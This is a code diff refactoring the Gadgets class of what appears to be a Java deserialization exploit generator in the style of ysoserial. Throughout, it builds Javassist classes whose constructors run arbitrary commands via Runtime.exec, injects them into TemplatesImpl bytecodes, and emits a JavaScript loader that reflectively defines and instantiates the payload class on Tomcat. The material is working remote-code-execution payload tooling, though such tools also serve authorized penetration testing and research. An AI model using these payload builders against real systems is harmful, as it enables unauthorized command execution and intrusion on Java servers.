@@ -51,69 +51,58 @@ public class Gadgets extends ClassLoader {
         return (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
     }
 
-    public static Object createTemplatesImpl(String command) throws Exception {
+    private static String sanitizeCommand(String command) {
         command = command.trim();
-
-        // 支持单双引号
         if (command.startsWith("'") || command.startsWith("\"")) {
             command = command.substring(1, command.length() - 1);
         }
+        return command;
+    }
 
-        CtClass ctClass;
-        byte[] classBytes = new byte[0];
+    private static CtClass createCtClass(String command) throws Exception {
+        command = sanitizeCommand(command);
         String newClassName = generateClassName();
 
-
-        final Object templates = TPL_CLASS.newInstance();
         POOL.insertClassPath(new ClassClassPath(ABST_TRANSLET));
         POOL.get(ABST_TRANSLET.getName());
 
-        // 扩展功能
+        CtClass ctClass;
         if (command.startsWith("LF-")) {
             ctClass = generateClass(command, newClassName);
+        } else if (IS_OBSCURE) {
+            ctClass = POOL.makeClass(newClassName);
+            insertCMD(ctClass);
+            CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
+            ctConstructor.setBody("{execCmd(\"" + command + "\");}");
+            ctClass.addConstructor(ctConstructor);
         } else {
-            // 普通的命令执行
-            if (IS_OBSCURE) {
-                ctClass = POOL.makeClass(newClassName);
-                insertCMD(ctClass);
-                CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
-                ctConstructor.setBody("{execCmd(\"" + command + "\");}");
-                ctClass.addConstructor(ctConstructor);
-            } else {
-                // 最短化
-                ctClass = POOL.makeClass(newClassName);
-                CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
-                ctConstructor.setBody("{Runtime.getRuntime().exec(\"" + command + "\");}");
-                ctClass.addConstructor(ctConstructor);
-            }
+            ctClass = POOL.makeClass(newClassName);
+            CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
+            ctConstructor.setBody("{Runtime.getRuntime().exec(\"" + command + "\");}");
+            ctClass.addConstructor(ctConstructor);
         }
 
-        // 如果全局配置继承，再设置父类
         if (IS_INHERIT_ABSTRACT_TRANSLET) {
             if (ctClass != null) {
                 shrinkBytes(ctClass);
             }
-
-            // 如果 payload 自身有父类，则使用 ClassLoaderTemplate 加载
-            // 否则直接设置父类
             if (ctClass != null && !"java.lang.Object".equals(ctClass.getSuperclass().getName())) {
                 ctClass = Utils.encapsulationByClassLoaderTemplate(ctClass.toBytecode());
             }
         }
 
-        // 按需保存文件
         saveCtClassToFile(ctClass);
-        if (ctClass != null) {
-            classBytes = ctClass.toBytecode();
-        }
+        return ctClass;
+    }
 
-        // 加载 class 试试
-//		loadClassTest(classBytes, ctClass.getName());
+    public static Object createTemplatesImpl(String command) throws Exception {
+        CtClass ctClass = createCtClass(command);
+        byte[] classBytes = ctClass.toBytecode();
 
-        // 写入前将 classBytes 中的类标识设为 JDK 1.6 的版本号
+        final Object templates = TPL_CLASS.getDeclaredConstructor().newInstance();
+
         classBytes[7] = 49;
 
-        // 恶意类是否继承 AbstractTranslet
         if (IS_INHERIT_ABSTRACT_TRANSLET) {
             Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes});
         } else {
@@ -121,145 +110,40 @@ public class Gadgets extends ClassLoader {
             insertField(newClass, "serialVersionUID", "private static final long serialVersionUID = 8207363842866235160L;");
 
             Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes, newClass.toBytecode()});
-            // 当 _transletIndex >= 0 且 classCount 也就是生成类的数量大于 1 时，不需要继承 AbstractTranslet
             Reflections.setFieldValue(templates, "_transletIndex", 0);
         }
 
-        // required to make TemplatesImpl happy
         Reflections.setFieldValue(templates, "_name", "anyStr");
-        Reflections.setFieldValue(templates, "_tfactory", TRANS_FACTORY.newInstance());
+        Reflections.setFieldValue(templates, "_tfactory", TRANS_FACTORY.getDeclaredConstructor().newInstance());
         return templates;
     }
 
     public static String createClassT(String command) throws Exception {
-        command = command.trim();
+        CtClass ctClass = createCtClass(command);
 
-        // 支持单双引号
-        if (command.startsWith("'") || command.startsWith("\"")) {
-            command = command.substring(1, command.length() - 1);
-        }
-
-        CtClass ctClass;
-        String newClassName = generateClassName();
-
-        POOL.insertClassPath(new ClassClassPath(ABST_TRANSLET));
-        POOL.get(ABST_TRANSLET.getName());
-
-        // 扩展功能
-        if (command.startsWith("LF-")) {
-            ctClass = generateClass(command, newClassName);
-        } else {
-            // 普通的命令执行
-            if (IS_OBSCURE) {
-                ctClass = POOL.makeClass(newClassName);
-                insertCMD(ctClass);
-                CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
-                ctConstructor.setBody("{execCmd(\"" + command + "\");}");
-                ctClass.addConstructor(ctConstructor);
-            } else {
-                // 最短化
-                ctClass = POOL.makeClass(newClassName);
-                CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
-                ctConstructor.setBody("{Runtime.getRuntime().exec(\"" + command + "\");}");
-                ctClass.addConstructor(ctConstructor);
-            }
-        }
-
-        // 如果全局配置继承，再设置父类
-        if (IS_INHERIT_ABSTRACT_TRANSLET) {
-            if (ctClass != null) {
-                shrinkBytes(ctClass);
-            }
-
-            // 如果 payload 自身有父类，则使用 ClassLoaderTemplate 加载
-            // 否则直接设置父类
-            if (ctClass != null && !"java.lang.Object".equals(ctClass.getSuperclass().getName())) {
-                ctClass = Utils.encapsulationByClassLoaderTemplate(ctClass.toBytecode());
-            }
-        }
-
-        byte[] bytes = null;
-        if (ctClass != null) {
-            bytes = ctClass.toBytecode();
-        }
+        byte[] bytes = ctClass.toBytecode();
         String classCode = Base64.getEncoder().encodeToString(bytes);
-        //System.out.println("Base64 Encoded CtClass: " + classCode);
-        if (ctClass != null) {
-            ctClass.detach();
-        }
+        String className = ctClass.getName();
+        ctClass.detach();
 
-        if (ctClass != null) {
-            return "var bytes = org.apache.tomcat.util.codec.binary.Base64.decodeBase64('" + classCode + "');\n" +
-                    "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();\n" +
-                    "try{\n" +
-                    "   var clazz = classLoader.loadClass('" + ctClass.getName() + "');\n" +
-                    "   clazz.newInstance();\n" +
-                    "}catch(err){\n" +
-                    "   var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
-                    "   method.setAccessible(true);\n" +
-                    "   var clazz = method.invoke(classLoader, bytes, 0, bytes.length);\n" +
-                    "   clazz.newInstance();\n" +
-                    "};";
-        }
-        return newClassName;
+        return "var bytes = org.apache.tomcat.util.codec.binary.Base64.decodeBase64('" + classCode + "');\n"
+                + "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();\n"
+                + "try{\n"
+                + "   var clazz = classLoader.loadClass('" + className + "');\n"
+                + "   clazz.newInstance();\n"
+                + "}catch(err){\n"
+                + "   var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n"
+                + "   method.setAccessible(true);\n"
+                + "   var clazz = method.invoke(classLoader, bytes, 0, bytes.length);\n"
+                + "   clazz.newInstance();\n"
+                + "};";
     }
 
     public static String createClassB(String command) throws Exception {
-        command = command.trim();
+        CtClass ctClass = createCtClass(command);
 
-        // 支持单双引号
-        if (command.startsWith("'") || command.startsWith("\"")) {
-            command = command.substring(1, command.length() - 1);
-        }
-
-        CtClass ctClass;
-        String newClassName = generateClassName();
-
-        POOL.insertClassPath(new ClassClassPath(ABST_TRANSLET));
-        POOL.get(ABST_TRANSLET.getName());
-
-        // 扩展功能
-        if (command.startsWith("LF-")) {
-            ctClass = generateClass(command, newClassName);
-        } else {
-            // 普通的命令执行
-            if (IS_OBSCURE) {
-                ctClass = POOL.makeClass(newClassName);
-                insertCMD(ctClass);
-                CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
-                ctConstructor.setBody("{execCmd(\"" + command + "\");}");
-                ctClass.addConstructor(ctConstructor);
-            } else {
-                // 最短化
-                ctClass = POOL.makeClass(newClassName);
-                CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
-                ctConstructor.setBody("{Runtime.getRuntime().exec(\"" + command + "\");}");
-                ctClass.addConstructor(ctConstructor);
-            }
-        }
-
-        // 如果全局配置继承，再设置父类
-        if (IS_INHERIT_ABSTRACT_TRANSLET) {
-            if (ctClass != null) {
-                shrinkBytes(ctClass);
-            }
-
-            // 如果 payload 自身有父类，则使用 ClassLoaderTemplate 加载
-            // 否则直接设置父类
-            if (ctClass != null && !"java.lang.Object".equals(ctClass.getSuperclass().getName())) {
-                ctClass = Utils.encapsulationByClassLoaderTemplate(ctClass.toBytecode());
-            }
-        }
-
-        String className = null;
-        if (ctClass != null) {
-            className = ctClass.getName();
-        }
-        if (ctClass != null) {
-            ctClass.writeFile();
-        }
-
-        //writeClassToFile(className, ctClass.toBytecode());
+        String className = ctClass.getName();
+        ctClass.writeFile();
 
         return className;
     }
